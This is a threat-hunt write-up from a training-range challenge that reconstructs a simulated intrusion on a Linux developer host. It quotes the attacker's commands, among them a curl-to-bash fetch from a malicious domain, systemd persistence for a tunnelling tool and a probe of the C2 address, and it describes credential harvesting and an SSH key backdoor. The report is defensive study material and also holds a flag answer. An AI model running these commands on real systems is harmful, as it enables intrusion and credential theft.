# Threat Hunt Report — Operation Greenfield
### GF-DEV01 Intrusion Analysis | April 30 – May 1, 2026
**Analyst:** Michael Kirby | **Classification:** Internal

---

## Platforms and Languages Leveraged
- Windows 11 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- SIEM: Microsoft Sentinel (Custom Log Tables)
- Linux: Ubuntu / GF-DEV01 (Target Host)

---

## Where It Started

It started with a case file. Nine closed alerts, a handful of open tickets, and a Linux developer box that nobody had looked at too closely. My job was to figure out what actually happened.

Before touching a single query, I read everything. The tickets, the closure notes, the timestamps. T1 had dismissed several alerts as false positives claiming baseline traffic, incomplete allowlists, that kind of thing. One closure caught my eye. **CLOSED-5** (a DNS query to a suspicious domain) fired right in the middle of what would later become the initial access window. Closed with thin rationale. That was my first thread to pull.

From there I oriented myself in the workspace. The Linux authentication pipeline runs through a custom log table `LinuxAuth_CL`. That's where identity events live on the Greenfield estate. I scoped everything to our 7-hour investigation window and the GF- host naming convention, and started building the picture.

---

## Phase 1 — Initial Access

The first real question was simple: how did the attacker get in?

I pivoted away from process logs and went straight to interactive shell history `LinuxShellHistory_CL`. If a human typed something, it would be here. I anchored my search to just before the implant's first known execution timestamp on GF-DEV01, filtering to the developer account `a.kumar`.

What came back was the delivery mechanism in plain text:

```bash
curl -fsSL https://dl.abordsecurity.space/install.sh | bash
```

One command. The attacker had compromised `a.kumar`'s session and used it to fetch a remote setup script directly from a malicious domain and pipe it straight into a bash interpreter. No file written to disk, no warning. The DNS query that CLOSED-5 caught? That was this exact lookup. T1 missed it.

With the delivery command confirmed, I moved to process telemetry `LinuxProcess_CL` to see what the script actually did. Scoping to a tight 30-second window around the execution timestamp revealed three core utilities deployed in rapid succession from a single parent shell:

- **curl** — downloaded the implant payload
- **chmod** — made it executable
- **nohup** — launched it in the background

The process lineage told the full story. The user's interactive shell (PID 32260) forked into a pipeline: PID 34608 (curl) fetched the script while PID 34609 (bash subshell) executed it. The subshell then spawned two children — PID 34612 to download `/tmp/helix-update`, and PID 34615 to chmod it. Finally, nohup launched the implant as PID 34616.

Then the subshell died. Something important happened.

When PID 34609 closed, its child PID 34616 became an orphan. Linux automatically re-parents orphaned processes to PID 1 (systemd). The implant detached from the terminal entirely and began running as a background daemon, completely invisible to the interactive session. This happened at **21:54:56 UTC**.

The account behind all of this? `a.kumar` — a developer account that T1 had overlooked entirely, having focused only on `sancadmin` and `t.harris`.

---

## Phase 2 — Implant Behavior & Credential Harvesting

With the implant confirmed running as PID 34616 under systemd, the next question was: what was it doing?

I pivoted into the Linux syscall audit table `LinuxSyscall_CL`. This is where auditd watch rules live, capturing kernel-level file access events that process creation logs simply don't show. Filtering to children of PID 34616 and summarizing by process name and watch key category revealed the implant's playbook:

| Tool | Watch Key | What It Touched |
|------|-----------|-----------------|
| aws | aws_creds | AWS credential files |
| bash | ssh_user_keys | SSH key files |
| kubectl | kube_creds | Kubernetes credentials |
| ssh | ssh_user_keys | SSH key files |

The implant was spawning these tools specifically to harvest credentials: cloud keys, Kubernetes configs, SSH keys. When I filtered the same table to the implant binary itself (excluding its children), the most frequently accessed watch key category was `claude_data` — accessed 6 times.

There was a more important finding buried in the same data. One watch key `ssh_user_keys` explained how the attacker got access to both compromised accounts: `sancadmin` and `t.harris`. SSH keys were the mechanism that unlocked both. The implant read SSH key files 5 times during this window.

To understand the network footprint, I pivoted to `LinuxNetwork_CL`. The traffic pattern wasn't what I expected — no obvious C2 beaconing. Instead, PID 34616 and its children were hitting Cloudflare IP ranges (104.16.x.x and 104.21.x.x). Four unique PIDs made outbound connections:

- **34612** — curl downloading helix-update from Cloudflare-fronted abordsecurity.space
- **34739** — node/npm hitting Cloudflare CDN
- **35250** — node/npm ci hitting Cloudflare CDN
- **43047** — node hitting Cloudflare CDN

This was intentional. By hosting the implant delivery infrastructure on Cloudflare (a shared CDN used by millions of legitimate sites) the attacker made perimeter blocking impossible without causing massive collateral damage. You can't just block 104.21.x.x.

To differentiate the malicious activity stream from normal session traffic during the 21:54–23:09 window, I compared two data sources: `LinuxShellHistory_CL` and `LinuxProcess_CL`. The differentiating fields were `ShellUser` in shell history and `ActorUsername` in process logs — the malicious stream showed blank actor context because the daemonized implant had no associated interactive session.

---

## Phase 3 — Backdoor Establishment & Attribution

The implant wasn't just harvesting credentials. It was also setting up a permanent foothold.

TKT-002 flagged a write event to `authorized_keys` but didn't recover the key itself. I queried `Syslog` around TKT-002's timestamp filtering for "authorized_keys" and found a Sysmon EventID 1 record — a process creation event containing the full command line including the appended SSH public key.

At the end of the base64 blob was a comment: **`octotempest@operator`**.

That comment was the operator's chosen handle, embedded directly in the artefact they left behind. In threat intelligence, that kind of self-attribution is gold — it's a pivot point that chains to known actor infrastructure and tradecraft.

To enrich the attacker's IP (`194.36.110.139`), I ran it through BGP whois. It resolved to **AS9009 — M247 Ltd**, a hosting provider commonly used by threat actors for C2 infrastructure. This IP was the source of the initial `sancadmin` SSH session (TKT-003).

Pulling the strongest single attribution signal from everything we'd found, it was the SSH key comment. One artefact carrying the operator's handle directly in the data — that's what threat intel chains attribution from.

Cross-referencing the full operator profile against known threat actor groups — the use of SSH key backdoors, credential harvesting, Cloudflare fronting, and the handle itself — all pointed to one group: **Scattered Spider** (also tracked as UNC3944 by Mandiant and Octo Tempest by Microsoft).

---

## Phase 4 — Lateral Movement Attempts

With `sancadmin`'s credentials in hand (harvested via SSH keys), the attacker SSH'd into DEV01 from `194.36.110.139` at **23:39:13 UTC** — 104 minutes after the implant was first daemonized. That dwell time wasn't wasted. They came back with a plan.

But before they could move laterally, they needed to validate the credentials. Auth logs on GF-WS01 showed a mixed pattern of failures and successes on `t.harris`'s account before the alerted RDP logon — not brute force, but methodical credential validation. They already had the password. They were testing it.

The lateral movement itself came through GF-DEV01 as a jump host. TKT-005 showed `t.harris` RDP-ing to GF-WS01 from 10.1.0.119 (a Kali machine that couldn't reach WS01 directly). TKT-004 showed DEV01's sshd and nc.openbsd forwarding traffic to 10.1.0.133:3389. The attacker had built an SSH port forward through DEV01 to make the connection appear to come from a trusted internal IP.

Once on GF-WS01, `t.harris` accessed `\\*\IPC$\samr` on GF-DC01 seven times in 32 seconds — SAMR enumeration, probing Active Directory for user and group information via the Security Account Manager Remote protocol.

Four closed false-positive alerts (CLOSED-1 through CLOSED-4) all timestamped at 23:47 UTC marked exactly when `t.harris` landed on GF-WS01. T1 correctly dismissed them as first-logon noise — but the cluster timing was forensically significant.

---

## Phase 5 — Second Stage & Persistence

When `sancadmin` SSH'd back in at 23:39 UTC, they didn't come empty handed. Two files appeared on DEV01 that hadn't been there before — `/tmp/helix-sync` and `/tmp/hbsync.exe`. They never showed up in shell history because they weren't typed. They were transferred via SFTP over the SSH session, written to disk by the `sftp-server` process.

The operator's first priority was persistence. Reading `sancadmin`'s shell history chronologically, the first cluster of commands told the story clearly:

```bash
chmod +x /usr/local/bin/helix-sync
systemctl enable helix-sync
systemctl start helix-sync
```

`helix-sync` was being established as a persistent systemd service — ensuring the C2 tunnel survived reboots. Microsoft Defender for Cloud fingerprinted it with a known signature: `HackTool:Linux/Ligolo.A!MTB`. This was a Ligolo tunnel component embedded in the Sliver C2 framework.

With persistence set, the operator turned to lateral movement. Their shell history showed a methodical progression through four techniques in order:

1. **ligolo** — setting up the C2 tunnel
2. **smb** — attempting file delivery via smbclient
3. **winrm** — attempting remote execution via PowerShell
4. **wmi** — attempting remote execution via wmi_exec.py

One command buried in the WinRM attempt was particularly interesting. The operator ran a PowerShell `Invoke-Command` with a `-enc` flag — a base64 encoded scriptblock. Decoding the outer UTF-16LE layer revealed another base64 string inside. Decoding that revealed the payload:

- **URL:** `https://sync.abordsecurity.space/helix-build-agent.exe`
- **Drop path:** `$env:TEMP\hbsync.exe`

Every single attempt failed. Return codes told the story — RC=1 across SMB delivery, RC=1 on WinRM execution, RC=0 on wmi_exec.py locally but no confirmed execution on Windows. The operator was improvising, trying tools before they were installed, payloads that never downloaded. `sancadmin` never landed beyond GF-DEV01.

The late-session shell history also showed the operator probing their own C2 infrastructure:

```bash
curl -I http://194.36.110.139:9080/
```

Same IP as TKT-003 but a different port — 9080 instead of 22. A HEAD request checking if the C2 listener was still alive.

---

## Phase 6 — Containment & Detection Engineering

With the full picture established, the next step was containment. The threat was live — the implant was still running, the backdoor was still in place. This wasn't a job for more investigation or threat intel profiling. It needed Incident Response.

The cleanup list for GF-DEV01 came from querying `LinuxFile_CL` for files created by operator accounts across the investigation window, combined with `Syslog` for command lines involving persistence mechanisms. Seven paths needed to go:

```
/tmp/helix-update
/tmp/helix-sync
/tmp/hbsync.exe
/tmp/wmi_exec.py
/usr/local/bin/helix-sync
/etc/systemd/system/helix-sync.service
/home/a.kumar/.ssh/authorized_keys
```

For detection engineering, the spawn pattern from the implant — `helix-update` running as a child of systemd (PPID 1) spawning credential harvesting tools — mapped directly to a Sigma rule:

```yaml
title: Sliver implant harvests credentials via process reparenting
logsource:
    product: linux
    service: auditd
detection:
    selection:
        Image|endswith: '/helix-update'
        ParentImage: '/sbin/init'
```

The logsource targets `auditd` — the kernel-level syscall audit daemon that captures execve events via watch rules. Severity: **high**. Near-zero false positive rate, high confidence, significant impact.

---

## End of Shift — What the Operator Left Behind

At the end of the attacker's shift, three artefacts remained on GF-DEV01:

**`helix-update`** — still running as PID 34616 under systemd. The original Sliver C2 implant, daemonized via nohup, never killed. Active in memory.

**`authorized_keys`** — permanently modified with the attacker's SSH public key (comment: `octotempest@operator`). A backdoor that survives reboots, giving persistent SSH access to `a.kumar`'s account from anywhere.

**`helix-sync`** — the staged copy sitting in `/tmp`, dropped via SFTP, never cleaned up. The installed copy was running as a service. This one was just dead weight left on disk — dormant.

**Final answer: `authorized_keys:persistent, helix-sync:dormant, helix-update:running`**

---

## What I Learned

This investigation reinforced a few things I won't forget:

- **Read the case file first.** The answer to multiple flags was already in the closed tickets. T1's closure notes told you exactly where to look.
- **Shell history only captures what humans type.** SFTP transfers, daemonized processes, scripted execution — none of it appears in `LinuxShellHistory_CL`. Always cross-reference with `LinuxFile_CL` and `LinuxProcess_CL`.
- **Return codes don't lie.** The operator failed completely at lateral movement. RC=1 everywhere. Reading return codes chronologically is the fastest way to understand what actually worked.
- **Synthesis is harder than querying.** The final flag required no new queries — just connecting dots from 40 previous answers. That's the hardest kind of thinking in threat hunting.
- **The artefact and the evidence are different things.** `octotempest@operator` is evidence. `authorized_keys` is the artefact. `claude_data` is a telemetry category. `helix-update` is the process. Getting that distinction right matters.

---

*A huge thank you to Josh Madakor for building The Cyber Range and creating a community where this kind of learning is possible, and to Mohammed A — the Threat Hunt Engineer behind this challenge. The level of detail and craft that went into this scenario is genuinely impressive. I struggled, I learned, and I came out a better analyst for it.*
